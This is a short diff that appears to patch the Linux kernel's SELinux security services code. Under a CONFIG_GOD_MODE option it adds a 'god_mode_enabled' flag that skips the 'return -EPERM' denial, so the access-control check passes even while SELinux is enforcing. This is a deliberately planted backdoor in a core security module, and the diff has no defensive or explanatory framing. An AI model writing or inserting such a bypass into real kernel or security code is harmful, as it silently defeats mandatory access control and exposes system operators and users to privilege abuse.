@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * Implementation of the security services.
  *
@@ -739,7 +742,15 @@ out:
 
 	if (!selinux_enforcing)
 		return 0;
-	return -EPERM;
+	
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 }
 
 int security_validate_transition(u32 oldsid, u32 newsid, u32 tasksid,
